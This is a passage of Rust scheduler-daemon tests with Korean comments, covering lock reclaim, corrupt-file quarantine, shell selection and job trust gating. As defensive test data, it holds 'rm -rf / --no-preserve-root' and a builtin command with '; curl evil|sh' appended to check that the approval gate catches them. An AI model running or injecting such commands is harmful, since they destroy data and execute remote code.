        assert_eq!(jobs.len(), 1);
        assert!(t0.elapsed() < Duration::from_millis(500), "읽기 전용 로더가 잠금을 기다렸다");
        assert_eq!(std::fs::read_to_string(&path).unwrap(), legacy, "읽기 전용 로더가 파일을 바꿨다");
        // 쓰기 모드: 잠금이 풀릴 때까지 기다린다(그 사이 파일 무접촉).
        let (tx, rx) = std::sync::mpsc::channel();
        let p2 = path.clone();
        let hot = std::thread::spawn(move || {
            let jobs = load_jobs_at(&p2, LoadMode::HotReload);
            tx.send(()).unwrap();
            jobs
        });
        assert!(rx.recv_timeout(Duration::from_millis(300)).is_err(), "핫리로드가 잠금을 기다리지 않았다");
        assert_eq!(std::fs::read_to_string(&path).unwrap(), legacy, "잠금 보유 중에 파일이 바뀌었다");
        drop(held);
        rx.recv_timeout(Duration::from_secs(5)).expect("잠금 해제 뒤 핫리로드가 끝나야 한다");
        let jobs = hot.join().unwrap();
        assert_eq!(jobs.len(), 1);
        // 잠금 아래에서 정규형으로 접혔다(triage X8 의 되쓰기는 유지된다 — 단일 writer 자리에서).
        let root: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(root["jobs"][0]["action"], json!(ACTION_PUSH_QUEUED));
        assert!(!ScheduleFileLock::lock_dir_for(&path).exists());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// ★(성찰 A11 ⓒ) 손상 격리 뒤 **같은 틱에서** builtin 이 복구된다 — 종전에는 재기동까지 전
    /// builtin(phoenix·learn·cycle·formation·promote) 이 침묵했다. 읽기 전용 로더는 격리하지 않는다.
    #[test]
    fn corrupt_schedule_is_quarantined_and_builtins_return_in_the_same_tick() {
        let dir = sched_dir("corrupt");
        let path = dir.join("schedule.json");
        std::fs::write(&path, b"{ this is not valid json ]").unwrap();
        // 읽기 전용: 격리하지 않는다(rename 은 쓰기다).
        assert!(load_jobs_at(&path, LoadMode::ReadOnly).is_empty());
        assert!(path.exists(), "읽기 전용 로더가 손상본을 격리(rename)했다");
        // 핫리로드: 격리 + 같은 호출에서 builtin 복구.
        let jobs = load_jobs_at(&path, LoadMode::HotReload);
        let quarantined = std::fs::read_dir(&dir).unwrap()
            .filter_map(|e| e.ok())
            .any(|e| e.file_name().to_string_lossy().contains(".corrupt-"));
        assert!(quarantined, "손상본이 격리되지 않았다");
        let builtin_ids: Vec<&str> = jobs.iter().map(|j| j.id.as_str()).collect();
        let expected: Vec<String> = builtin_jobs()
            .iter()
            .filter_map(|j| j["id"].as_str().map(str::to_string))
            .collect();
        assert!(!expected.is_empty());
        for id in &expected {
            assert!(builtin_ids.contains(&id.as_str()), "같은 틱 복구에 builtin {id} 가 없다: {builtin_ids:?}");
        }
        let root: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert!(root["jobs"].as_array().unwrap().len() >= expected.len());
        assert!(!ScheduleFileLock::lock_dir_for(&path).exists());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// 죽은 보유자의 잠금(부패 mtime)은 깨고 진입한다 · 살아있는 잠금은 대기 상한에서 `None`.
    #[test]
    fn stale_schedule_lock_is_broken_and_live_lock_times_out() {
        let dir = sched_dir("stale");
        let path = dir.join("schedule.json");
        let lock_dir = ScheduleFileLock::lock_dir_for(&path);
        std::fs::create_dir(&lock_dir).unwrap();
        std::thread::sleep(Duration::from_millis(30));
        // 부패 상한 10ms → 30ms 된 잠금은 깨진다.
        let got = ScheduleFileLock::acquire_with(&path, Duration::from_millis(200), Duration::from_millis(10));
        assert!(got.is_some(), "부패 잠금을 깨지 못했다");
        // 살아있는(방금 만든) 잠금은 대기 상한 안에 못 잡는다 — 잠금 없이 쓰는 경로는 없다.
        let again = ScheduleFileLock::acquire_with(&path, Duration::from_millis(100), Duration::from_secs(30));
        assert!(again.is_none(), "살아있는 잠금을 뚫었다");
        drop(got);
        assert!(!lock_dir.exists());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// ★(0.14.31 · 성찰 확인 · blocking) **CLI 가 남긴 부패 잠금에서 데몬 acquire 가 유계로 끝난다.**
    ///
    /// 【무엇이 틀렸었나】 부패 갈래가 `remove_dir`(비재귀) + `continue` 였다. CLI 잠금
    /// (`cys.rs::acquire_schedule_lock`)은 `create_dir` **직후 잠금 디렉터리 안**에 owner 파일을
    /// 쓴다 — 그 창에서 `cys schedule add|rm` 이 SIGKILL 되면 **비어 있지 않은** 잠금이 남는다.
    /// 부패 문턱을 넘긴 뒤 데몬이 들어오면 `remove_dir` 는 ENOTEMPTY 로 실패하고, mtime 이 그대로라
    /// `stale_now` 는 계속 참이며, `continue` 가 deadline 검사와 sleep 을 건너뛰어 **함수가 절대
    /// 반환하지 않는다**. 이 함수는 `ensure_builtin_jobs()` 로 accept 루프 **이전**에 동기로 불리므로
    /// 데몬이 소켓을 한 번도 받지 않고 코어 하나를 100% 태운다(부트체인 전손).
    ///
    /// 【검체 형상】 종전 검체(`stale_schedule_lock_is_broken_and_live_lock_times_out`)는 **빈**
    /// 잠금만 만들어 이 교차 시나리오가 검체 밖이었다. 여기서는 CLI 가 남기는 실제 형상(owner 파일이
    /// 든 잠금)을 만들고 ① 유계 종료 ② 실제 회수를 잰다. 무한 스핀 회귀 시 검체가 **함께 멎지
    /// 않도록** 별도 스레드 + `recv_timeout` 으로 잰다(하네스 정지 방지).
    #[test]
    fn corrupt_nonempty_schedule_lock_left_by_the_cli_is_reclaimed_within_the_deadline() {
        let dir = sched_dir("corrupt-lock");
        let path = dir.join("schedule.json");
        let lock_dir = ScheduleFileLock::lock_dir_for(&path);
        std::fs::create_dir_all(&lock_dir).unwrap();
        // CLI 가 남기는 실제 형상 — 잠금 디렉터리 **안**의 owner 파일(cys.rs:5270).
        std::fs::write(lock_dir.join("owner"), "4242\n").unwrap();
        std::thread::sleep(Duration::from_millis(30));
        let (tx, rx) = std::sync::mpsc::channel();
        let p2 = path.clone();
        std::thread::spawn(move || {
            let got = ScheduleFileLock::acquire_with(
                &p2,
                Duration::from_millis(200),
                Duration::from_millis(10),
            );
            let _ = tx.send(got);
        });
        let got = rx
            .recv_timeout(Duration::from_secs(5))
            .expect("부패(비어 있지 않은) 잠금에서 acquire 가 유계로 끝나지 않았다 — 무한 스핀");
        assert!(
            got.is_some(),
            "CLI 가 남긴 owner 든 잠금을 데몬이 회수하지 못했다(두 writer 의 비대칭)"
        );
        drop(got);
        assert!(!lock_dir.exists(), "해제가 잠금을 남겼다");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// ★(0.14.31 · 성찰 확인 · blocking) **회수가 지속 실패해도 유계다** — 회수 실패의 귀결은
    /// 유계 대기 뒤 `None`(쓰기 포기 = 막는 방향)이지 무한 대기가 아니다.
    ///
    /// 【형상】 회수가 **반드시** 실패하는 잠금을 만든다: 잠금 디렉터리 안에 항목을 두고 그
    /// 디렉터리를 읽기 전용(0o555)으로 만든다 — 안의 항목을 지울 수 없으므로 `remove_dir` 도
    /// `remove_dir_all` 도 실패한다(Windows 의 sharing violation 과 같은 자리 · 그쪽은 이식성
    /// 있게 만들 수 없어 권한으로 대신한다 · `#[cfg(unix)]`).
    ///
    /// 【무엇을 가르는가】 종전 갈래(`remove_dir` + `continue`)는 deadline 을 **한 번도** 검사하지
    /// 않으므로 여기서 영원히 돈다(개정 전 소스에서 이 검체는 recv_timeout 으로 붉다). 개정 뒤에는
    /// 대기 상한을 지나 `None` 이다. 무한 스핀 회귀 시 검체가 함께 멎지 않도록 별도 스레드로 잰다.
    #[cfg(unix)]
    #[test]
    fn schedule_lock_deadline_is_checked_even_when_stale_reclaim_keeps_failing() {
        use std::os::unix::fs::PermissionsExt;
        let dir = sched_dir("noreclaim");
        let path = dir.join("schedule.json");
        let lock_dir = ScheduleFileLock::lock_dir_for(&path);
        std::fs::create_dir_all(lock_dir.join("inner")).unwrap();
        let mut perm = std::fs::metadata(&lock_dir).unwrap().permissions();
        perm.set_mode(0o555); // 안의 항목을 지울 수 없다 = 회수는 반드시 실패한다
        std::fs::set_permissions(&lock_dir, perm).unwrap();
        if std::fs::remove_dir(lock_dir.join("inner")).is_ok() {
            // 권한이 무의미한 실행(root 등) — 이 파일계에서는 '회수 실패' 를 만들 수 없다.
            let mut perm = std::fs::metadata(&lock_dir).unwrap().permissions();
            perm.set_mode(0o755);
            let _ = std::fs::set_permissions(&lock_dir, perm);
            let _ = std::fs::remove_dir_all(&dir);
            eprintln!("skip: 회수 실패를 만들 수 없는 실행 환경(root?) — 측정 불가");
            return;
        }
        let (tx, rx) = std::sync::mpsc::channel();
        let p2 = path.clone();
        std::thread::spawn(move || {
            let t0 = std::time::Instant::now();
            let got = ScheduleFileLock::acquire_with(
                &p2,
                Duration::from_millis(120),
                Duration::from_millis(0),
            );
            let _ = tx.send((got.is_some(), t0.elapsed()));
        });
        let (acquired, took) = rx
            .recv_timeout(Duration::from_secs(5))
            .expect("회수가 계속 실패하는 잠금에서 acquire 가 반환하지 않았다 — 무한 스핀(부트 정지)");
        assert!(!acquired, "회수하지 못한 잠금을 쥐었다고 보고했다(상호 배제 붕괴)");
        assert!(took < Duration::from_secs(5), "대기 상한(120ms)을 크게 넘겼다: {took:?}");
        let mut perm = std::fs::metadata(&lock_dir).unwrap().permissions();
        perm.set_mode(0o755);
        let _ = std::fs::set_permissions(&lock_dir, perm);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn corrupt_persistence_is_quarantined_not_silently_dropped() {
        // 회귀 가드 (W0-3): 존재하나 파싱 불가한 영속 파일은 조용히 기본값으로 대체되지 않고
        // 손상본이 <name>.corrupt-<epoch>로 격리돼야 한다(24/365 데몬의 하트비트·fire-state
        // 무음 소실 차단 — 헌장 복원 불변식). schedule_path()는 pack_dir 고정이라 핵심
        // 격리 동작인 quarantine_corrupt를 직접 검증한다.
        use std::io::Write;
        let dir = std::env::temp_dir().join(format!(
            "cys-sched-corrupt-{}-{}",
            std::process::id(),
            now_epoch().to_bits()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let p = dir.join("schedule.json");
        std::fs::File::create(&p)
            .unwrap()
            .write_all(b"{ this is not valid json ]")
            .unwrap();
        let backup = quarantine_corrupt(&p).expect("손상 파일은 격리(rename)돼야 한다");
        assert!(backup.exists(), "격리 백업 파일이 존재해야 한다(데이터 보존)");
        assert!(!p.exists(), "원본 손상 파일은 이동돼 자리에 남지 않아야 한다");
        assert!(
            backup.file_name().unwrap().to_string_lossy().contains(".corrupt-"),
            "백업 이름에 .corrupt- 표식이 있어야 한다"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn schedule_state_is_versioned_and_additive() {
        // schema_version 도입은 추가-전용 — 구파일(필드 부재)도 default 0으로 로드돼야 하고
        // (마이그레이션 호환), 신규 직렬화는 현재 버전을 실어야 한다.
        let old: ScheduleState =
            serde_json::from_str(r#"{"last_fired":{"j":5}}"#).expect("구파일도 로드돼야 함");
        assert_eq!(old.schema_version, 0, "구파일은 schema_version 0으로 로드(추가-전용)");
        assert_eq!(old.last_fired.get("j"), Some(&5));
        let mut s = ScheduleState::default();
        s.schema_version = SCHEDULE_STATE_VERSION;
        let json = serde_json::to_string(&s).unwrap();
        assert!(json.contains("schema_version"), "직렬화는 schema_version을 실어야 한다");
        let back: ScheduleState = serde_json::from_str(&json).unwrap();
        assert_eq!(back.schema_version, SCHEDULE_STATE_VERSION);
    }

    #[test]
    fn command_shell_matches_platform() {
        // 회귀 가드: fire_command가 sh -c 하드코딩이면 Windows에서 항상 NotFound로
        // 실패한다. default_shell/create_surface와 동일하게 플랫폼별로 분기해야 한다.
        let (shell, flag) = command_shell();
        #[cfg(windows)]
        {
            // 동봉 bash 탐지 시 (절대경로,-c) · 미탐지 시에만 (cmd,/C) 폴백.
            if flag == "-c" {
                assert!(
                    shell.to_ascii_lowercase().ends_with("bash.exe"),
                    "-c 플래그는 bash 승격 경로에서만 나온다 — got: {shell}"
                );
            } else {
                assert_eq!(shell, "cmd");
                assert_eq!(flag, "/C");
            }
        }
        #[cfg(not(windows))]
        {
            assert_eq!(shell, "sh");
            assert_eq!(flag, "-c");
        }
    }

    /// ★핀(v0.13.22 백포트): Windows 셸 선택의 순수 코어 — 동봉 bash.exe 가 있으면 그 절대경로를
    /// 고르고(후보 순서 우선), 없으면 None(→ command_shell 이 cmd 폴백). 파일시스템만 보는 순수
    /// 함수라 어느 OS 에서도 결정론으로 검증된다(윈도우 실기 없이 결함 재발을 잡는 유일한 핀).
    #[test]
    fn resolve_bash_picks_bundled_and_falls_back_when_absent() {
        let root = std::env::temp_dir().join(format!(
            "cys-sched-bash-{}-{}",
            std::process::id(),
            now_epoch().to_bits()
        ));
        let miss = root.join("git").join("cmd"); // bash.exe 없는 후보
        let hit = root.join("git").join("bin"); // PortableGit 본진
        let hit2 = root.join("git").join("usr").join("bin");
        for d in [&miss, &hit, &hit2] {
            std::fs::create_dir_all(d).unwrap();
        }
        // 부재: 후보가 전부 비면 폴백(None)이어야 한다 — 없는 bash 를 강제 선택하면 전 잡이 spawn 실패.
        assert_eq!(
            resolve_bash_in(vec![miss.clone(), hit.clone()]),
            None,
            "bash.exe 부재 후보만 있으면 None(cmd 폴백)"
        );
        std::fs::write(hit.join("bash.exe"), b"stub").unwrap();
        std::fs::write(hit2.join("bash.exe"), b"stub").unwrap();
        assert_eq!(
            resolve_bash_in(vec![miss.clone(), hit.clone(), hit2.clone()]),
            Some(hit.join("bash.exe")),
            "실재하는 첫 후보를 절대경로로 선택(후보 순서 = 우선순위)"
        );
        // 빈 후보 목록(runtime 비동봉 설치)도 안전하게 None.
        assert_eq!(resolve_bash_in(Vec::new()), None);
        let _ = std::fs::remove_dir_all(&root);
    }

    /// ★핀: 스케줄 발화 자식 env — 동봉 runtime PATH 선두 주입 + (Windows bash 비로그인 셸용)
    /// HOME 보정. 종전엔 둘 다 없어 데몬 PATH 로는 python3/printf 를 못 찾고 `${HOME}` 도 붕괴했다.
    #[test]
    fn spawn_env_injects_runtime_path_and_backfills_home() {
        let exe_dir = std::env::temp_dir().join(format!(
            "cys-sched-env-{}-{}",
            std::process::id(),
            now_epoch().to_bits()
        ));
        std::fs::create_dir_all(&exe_dir).unwrap();
        let pairs = cys::spawn_env_pairs(&exe_dir, "/usr/bin:/bin", Some("/Users/user"), None);
        let path = pairs
            .iter()
            .find(|(k, _)| k == "PATH")
            .map(|(_, v)| v.clone())
            .expect("PATH 주입 쌍이 있어야 한다(office-bridge·auto-restore 동일 SOT)");
        assert!(
            path.starts_with(&exe_dir.to_string_lossy().to_string()),
            "동봉 바이너리 폴더가 PATH 선두여야 한다 — got: {path}"
        );
        assert!(path.contains("/usr/bin"), "기존 PATH 는 보존돼야 한다 — got: {path}");
        assert!(
            !pairs.iter().any(|(k, _)| k == "HOME"),
            "HOME 이 이미 있으면 무접촉(unix 무변경 보장)"
        );
        // HOME 부재(Windows bash -c 비로그인 셸) → USERPROFILE 로 보정.
        let win = cys::spawn_env_pairs(&exe_dir, "/usr/bin", None, Some("C:\\Users\\x"));
        assert_eq!(
            win.iter().find(|(k, _)| k == "HOME").map(|(_, v)| v.as_str()),
            Some("C:\\Users\\x"),
            "HOME 미설정이면 ${{HOME}} 전개가 붕괴한다 — USERPROFILE 로 채워야 한다"
        );
        // 빈 문자열 USERPROFILE 은 보정 근거가 못 된다(빈 HOME 을 심으면 경로가 더 나빠진다).
        let neither = cys::spawn_env_pairs(&exe_dir, "/usr/bin", None, Some(""));
        assert!(!neither.iter().any(|(k, _)| k == "HOME"));
        let _ = std::fs::remove_dir_all(&exe_dir);
    }

    /// ★핀: command 잡이 exit≠0 로 끝나면 command_done **에 더해** schedule.error 가 발행돼야 한다.
    /// 종전엔 Ok 로 삼켜 schedule.fired 만 나갔다 — 잡이 매 주기 실패해도 이벤트상 '성공'
    /// 이라 무음 고장이었다(윈도우 잡 전멸을 이벤트로는 볼 수 없던 이유).
    #[tokio::test(flavor = "current_thread")]
    async fn failing_command_job_publishes_schedule_error() {
        let daemon = test_daemon();
        let mut j = job(None, &[]);
        j.id = "failing-cmd".into();
        j.action = "command".into();
        j.command = Some("exit 3".into());
        fire(Arc::clone(&daemon), j).await;
        let events = daemon.bus.replay_after(0);
        let named = |n: &str| {
            events
                .iter()
                .find(|e| e["name"].as_str() == Some(n))
                .cloned()
        };
        let done = named("schedule.command_done").expect("command_done 은 종전대로 발행(무회귀)");
        assert_eq!(done["payload"]["exit"].as_i64(), Some(3));
        let err = named("schedule.error").expect("exit≠0 은 schedule.error 로 표면화돼야 한다");
        assert_eq!(err["payload"]["job_id"].as_str(), Some("failing-cmd"));
        let msg = err["payload"]["error"].as_str().unwrap_or("");
        assert!(msg.contains('3'), "에러에 exit code 가 실려야 한다 — got: {msg}");
        assert!(
            named("schedule.fired").is_none(),
            "실패 발화가 fired 로도 보고되면 모니터링이 모순된다"
        );
    }

    /// ★R2 codex medium 핀: 폴백 경고 재발행 판정 — bash 승격(-c)이면 절대 발행하지 않고,
    /// cmd 폴백(/C)은 미발행 또는 1시간 경과 시에만 재발행(스팸 없이 무음도 없는 유계 재발행).
    #[test]
    fn fallback_warning_is_throttled_not_once() {
        // bash 승격 경로 — 어떤 시각에도 경고 없음
        assert!(!should_warn_fallback("-c", 0, 10_000));
        assert!(!should_warn_fallback("-c", 5_000, 10_000));
        // cmd 폴백 — 최초(미발행)는 발행
        assert!(should_warn_fallback("/C", 0, 10_000));
        // 직전 발행 후 1시간 미만 — 억제 (스팸 차단)
        assert!(!should_warn_fallback("/C", 10_000, 10_000 + 3_599));
        // 1시간 경과 — 재발행 (종전 AtomicBool 1회 방식은 여기서 영구 무음으로 회귀했다)
        assert!(should_warn_fallback("/C", 10_000, 10_000 + 3_600));
    }

    /// ★T-0147-2 §1-B N6b 핀(순수부): stdout 토큰 파싱 — 정상·중복·미지 거부·상한·문법.
    #[test]
    fn gate_signals_from_stdout_allowlists_and_dedupes() {
        // 정상 1건 — 요약 줄 안에 섞여 있어도 토큰만 뽑는다.
        assert_eq!(
            gate_signals_from_stdout("gate ok nodes=4 gate_signal=state_unwritable lane=base"),
            vec!["state_unwritable".to_string()]
        );
        // 여러 줄·중복 → 1건
        assert_eq!(
            gate_signals_from_stdout(
                "gate_signal=state_unwritable\n다른 줄\ngate_signal=state_unwritable\n"
            ),
            vec!["state_unwritable".to_string()]
        );
        // 미지 토큰 거부(deny-by-default) — stdout 은 신뢰 경계 밖이다.
        assert!(gate_signals_from_stdout("gate_signal=rm_rf_root").is_empty());
        assert!(gate_signals_from_stdout("gate_signal=state_unwritable_extra").is_empty());
        assert!(gate_signals_from_stdout("gate_signal=STATE_UNWRITABLE").is_empty(), "소문자만");
        assert!(gate_signals_from_stdout("gate_signal=").is_empty(), "빈 name 거부");
        assert!(gate_signals_from_stdout("gate_signal= state_unwritable").is_empty());
        // 길이 초과(>40)는 절단이 아니라 거부
        assert!(gate_signals_from_stdout(&format!("gate_signal={}", "a".repeat(41))).is_empty());
        // 토큰 없는 평범한 stdout
        assert!(gate_signals_from_stdout("게이트 정상 종료\n").is_empty());
        // 상한 4 — 현재 allowlist 가 1종이라 dedupe 로 이미 1건이지만, 상한 상수가 살아있음을
        // 계약으로 남긴다(allowlist 확장 시 여기가 폭주 방지선).
        let flood = "gate_signal=state_unwritable ".repeat(50);
        assert!(gate_signals_from_stdout(&flood).len() <= 4);
    }

    /// ★T-0147-2 §1-B N6b 핀(배선): stdout 토큰을 내는 command 잡 → `gate.state_unwritable`
    /// 이벤트 발행. 데몬이 state 를 못 쓰는 게이트의 유일한 목격자가 된다.
    #[tokio::test(flavor = "current_thread")]
    async fn command_job_stdout_token_publishes_gate_signal_event() {
        let daemon = test_daemon();
        let mut j = job(None, &[]);
        j.id = "gate-signal-cmd".into();
        j.action = "command".into();
        // echo 는 sh/cmd 양쪽에서 동일하게 동작한다(플랫폼 무관 핀).
        j.command = Some("echo gate_signal=state_unwritable".into());
        fire(Arc::clone(&daemon), j).await;
        let events = daemon.bus.replay_after(0);
        let sig = events
            .iter()
            .find(|e| e["name"].as_str() == Some("gate.state_unwritable"))
            .expect("stdout 토큰은 gate.* 이벤트로 승격돼야 한다");
        assert_eq!(sig["payload"]["job_id"].as_str(), Some("gate-signal-cmd"));
        assert_eq!(sig["payload"]["signal"].as_str(), Some("state_unwritable"));
        // 무회귀: 기존 command_done·fired 는 그대로.
        let has = |n: &str| events.iter().any(|e| e["name"].as_str() == Some(n));
        assert!(has("schedule.command_done") && has("schedule.fired"));
        // CC 배지 축에도 흡수됐는지(state 외부 oracle 의 사람이 보는 표면).
        let badges = crate::alerts::gate_signal_badges(now_epoch());
        assert!(
            badges.iter().any(|b| b.key == "signal/gate.state_unwritable"
                && b.severity == "critical"),
            "게이트 신호는 critical 배지로 노출돼야 한다"
        );
    }

    /// 대칭 핀: 토큰 없는 평범한 command 잡은 gate.* 를 만들지 않는다(오염 0).
    #[tokio::test(flavor = "current_thread")]
    async fn command_job_without_token_publishes_no_gate_signal() {
        let daemon = test_daemon();
        let mut j = job(None, &[]);
        j.id = "plain-cmd".into();
        j.action = "command".into();
        j.command = Some("echo hello".into());
        fire(Arc::clone(&daemon), j).await;
        let events = daemon.bus.replay_after(0);
        assert!(
            !events
                .iter()
                .any(|e| e["name"].as_str().is_some_and(|n| n.starts_with("gate."))),
            "토큰 없는 stdout 이 gate.* 를 만들면 이벤트 공간이 오염된다"
        );
    }

    #[tokio::test(flavor = "current_thread")]
    async fn successful_command_job_still_reports_fired() {
        // 대칭 확인(성공 경로 무변경): exit 0 은 command_done + fired, error 없음.
        let daemon = test_daemon();
        let mut j = job(None, &[]);
        j.id = "ok-cmd".into();
        j.action = "command".into();
        j.command = Some("exit 0".into());
        fire(Arc::clone(&daemon), j).await;
        let events = daemon.bus.replay_after(0);
        let has = |n: &str| events.iter().any(|e| e["name"].as_str() == Some(n));
        assert!(has("schedule.command_done") && has("schedule.fired"));
        assert!(!has("schedule.error"), "성공 경로에 error 가 새로 생기면 회귀다");
    }

    #[test]
    fn command_shell_actually_spawns_on_this_platform() {
        // 선택된 셸이 실제로 현재 플랫폼에서 spawn되는지 확인 — 잘못된 셸명이면
        // ErrorKind::NotFound로 실패한다. (Windows CI에서 cmd, 그 외에서 sh 검증)
        let (shell, flag) = command_shell();
        let out = std::process::Command::new(shell)
            .arg(flag)
            .arg("echo cys")
            .output()
            .expect("command_shell() must select a shell present on this platform");
        assert!(out.status.success());
        assert!(String::from_utf8_lossy(&out.stdout).contains("cys"));
    }

    // R-CLI-4: 코드 소유 built-in text_command만 무승인 신뢰, 임의·변조 명령은 승인 게이트 대상.
    #[test]
    fn builtin_text_commands_are_trusted_others_gated() {
        for j in builtin_jobs() {
            if let Some(cmd) = j.get("text_command").and_then(|v| v.as_str()) {
                assert!(
                    is_trusted_builtin_text_command(cmd),
                    "built-in text_command이 신뢰되지 않음: {cmd}"
                );
            }
        }
        // 임의 명령은 built-in 아님 → 승인 게이트 대상.
        assert!(
            !is_trusted_builtin_text_command("rm -rf / --no-preserve-root"),
            "임의 명령이 built-in으로 신뢰됨"
        );
        // built-in을 변조(뒤에 명령 추가)하면 더는 신뢰 안 함.
        let base = builtin_jobs()[0]["text_command"].as_str().unwrap().to_string();
        assert!(
            !is_trusted_builtin_text_command(&format!("{base} ; curl evil|sh")),
            "변조된 built-in이 신뢰됨"
        );
    }

    // ═══════ ★(0.14.31 · WP-3 B) CSO alert inbox 60분 점검 잡 · via_queue 계약 ═══════

    /// ★신규 builtin 잡의 계약 핀. **버전 범프 없이** append 되고, 이 잡만 `via_queue` 다.
    ///
    /// 왜 `via_queue` 인가: 스케줄 push 는 `fire_push`→`inject` 로 큐를 **우회**한다(§8 명시).
    /// CSO 앞 정기 점검이 그 경로를 타면 초안·alt-screen·승인대기·빈 좌석·pause 게이트를 전부
    /// 건너뛰고 좌석에 글자를 꽂는다 — 그것이 부트체인 치명위험 ①(폭주)의 정확한 형상이다.
    #[test]
    fn alert_inbox_job_is_queue_routed_and_added_without_version_bump() {
        let mut jobs: Vec<serde_json::Value> = Vec::new();
        let (changed, conflicts, _) = apply_builtin_jobs(&mut jobs);
        assert!(changed && conflicts.is_empty());
        let j = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("cso-alert-inbox-check-60m"))
            .expect("WP-3 B 60분 점검 잡 부재")
            .clone();
        assert_eq!(j["every_minutes"].as_u64(), Some(60), "정본 '정기 60분 점검'");
        // ★(리뷰 R1 · codex blocking) **강등 안전**: 이 잡의 action 은 구 데몬이 **모르는** 이름이다.
        //   `action:"push"` + `via_queue` 로만 표현하면 구 데몬(롤백)이 미지 필드를 무시하고
        //   직접 주입한다 — 초안·승인 화면에 글자와 Return 이 꽂힌다.
        assert_eq!(j["action"].as_str(), Some(ACTION_PUSH_QUEUED), "큐 경유가 계약인 push 레인");
        assert!(
            !LEGACY_ACTIONS.contains(&j["action"].as_str().unwrap()),
            "구 데몬이 아는 action 이면 강등 시 게이트 없이 주입된다"
        );
        assert_eq!(j["to"].as_str(), Some("cso"));
        assert_eq!(j["if_absent"].as_str(), Some("skip"), "좌석 부재는 에러가 아니다");
        assert_eq!(j["via_queue"].as_bool(), Some(true), "이 잡만 큐 경유(게이트 통과)");
        assert_eq!(j["base_only"].as_bool(), None, "부서 데몬도 자기 CSO 를 점검한다(base 전용 아님)");
        // ★범프 금지 — 신규 id 는 버전 무관 append 다(범프는 기존 builtin 을 코드 정의로 통째
        //   교체해 운영자 수기 편집을 무언 소실시킨다).
        assert_eq!(BUILTIN_JOBS_VERSION, 2, "신규 잡 추가로 버전을 올리지 않았다");
        assert_eq!(j["_builtin_version"].as_u64(), Some(BUILTIN_JOBS_VERSION));
        // 재실행 무접촉(중복 0) — add-if-missing 멱등.
        let (c2, _, _) = apply_builtin_jobs(&mut jobs);
        assert!(!c2, "동버전 재실행은 무접촉");
        assert_eq!(
            jobs.iter().filter(|j| j["id"].as_str() == Some("cso-alert-inbox-check-60m")).count(),
            1,
            "재실행에도 중복 생성 0"
        );
        // ★다른 builtin 잡은 **하나도** via_queue 가 아니다(기존 잡 무회귀 — 직접 주입 의미 보존).
        for other in jobs.iter().filter(|x| x["id"].as_str() != Some("cso-alert-inbox-check-60m")) {
            assert!(
                other.get("via_queue").is_none(),
                "{} 에 via_queue 가 붙었다(기존 잡 의미 변경)",
                other["id"]
            );
        }
        // 문안 계약: 선두 라벨을 스스로 달지 않는다(ensure_machine_label 이 `[schedule <id>]` 를
        // 붙인다) · CSO 를 다시 구독(Monitor)·크론으로 돌려보내지 않는다.
        let text = j["text"].as_str().expect("점검 문안 부재");
        assert!(!text.starts_with('['), "선두 라벨은 데몬이 단다(중복 라벨 금지): {text}");
        assert_eq!(
            ensure_machine_label(text, "cso-alert-inbox-check-60m"),
            format!("[schedule cso-alert-inbox-check-60m] {text}")
        );
        assert!(text.contains("Monitor"), "직접 구독 금지 문구가 있어야 한다");
        assert!(text.contains("무이상 무기록"), "무이상 무기록 규약 문구가 있어야 한다");
    }

    /// ★`Job::via_queue` 는 **추가-전용** 필드다: 구 schedule.json(필드 부재)은 false 로 읽히고,
    /// 그 잡들은 종전대로 직접 주입 경로를 탄다(무회귀).
    #[test]
    fn via_queue_defaults_false_for_legacy_schedule_files() {
        let legacy: Job = serde_json::from_value(json!({
            "id": "legacy", "action": "push", "to": "master", "text": "x"
        }))
        .expect("구 파일 파싱");
        assert!(!legacy.via_queue, "부재 = false(기존 잡 전원 무회귀)");
        let opted: Job = serde_json::from_value(json!({
            "id": "new", "action": "push", "to": "cso", "text": "x", "via_queue": true
        }))
        .expect("신 파일 파싱");
        assert!(opted.via_queue);
    }

    /// ★배달 선택은 대상 좌석이 확정된 **뒤** 한 지점에서만 갈린다 — `fresh` 경로와 일반 경로가
    /// **같은 함수**를 부르지 않으면 `fresh: true` 하나로 게이트를 통째 우회할 수 있다.
    /// (소스 핀 — 행동 검체는 아래 `deliver_push_branches_are_observable` 가 진다.)
    #[test]
    fn source_pin_both_push_paths_share_one_delivery_choice() {
        let src = include_str!("schedule.rs");
        let at = src.find("async fn fire_push(").expect("fire_push 소실");
        // fire_push 본문만 자른다 — 바로 뒤의 `deliver_push`(그 안에 직접 주입이 **있어야** 한다)를
        // 포함하면 아래 음성 단언이 자기 자신을 잡는다.
        let end = src[at..]
            .find("fn deliver_push(")
            .map(|e| at + e)
            .expect("deliver_push 소실");
        let body = &src[at..end];
        assert_eq!(
            body.matches("deliver_push(daemon, job, sid, text,").count(),
            2,
            "fresh 경로와 일반 경로 **양쪽**이 같은 배달 선택을 타야 한다"
        );
        assert!(
            !body.contains("inject(daemon, sid, text)?;"),
            "fire_push 안에 직접 주입이 남아 있다(via_queue 가 우회된다)"
        );
        // ★fresh 의 TTL 회수 배선(리뷰 R2 · claude minor로 **재핀**).
        //
        // R1 은 "회수 등록이 배달 **앞**" 을 핀으로 박았다. 그 순서 자체가 결함이었다:
        // `effective_close_ttl` 은 `close_after_secs: 0` 을 그대로 Some(0) 으로 돌리므로
        // 멀티스레드 런타임에서 회수 태스크가 **배달보다 먼저** 좌석을 닫을 수 있었다
        // (`deliver_push` 가 SeatGone·"surface gone" 으로 실패 — 종전 순서에는 없던 경로).
        //
        // 지켜야 할 불변은 순서가 아니라 **무조건성**이다: 성공·실패 어느 반환 경로에서도
        // 회수가 걸려야 갓 띄운 좌석이 누수되지 않는다. 그래서 배달 결과를 손에 쥔 채
        // (`let delivered = deliver_push(...);`) 등록하고 그 뒤에 `?` 로 전파한다.
        let ttl_at = body.find("effective_close_ttl(job)").expect("fresh TTL 회수 배선이 사라졌다");
        let deliver_at = body.find("deliver_push(daemon, job, sid, text,").expect("배달 호출 소실");
        assert!(
            deliver_at < ttl_at,
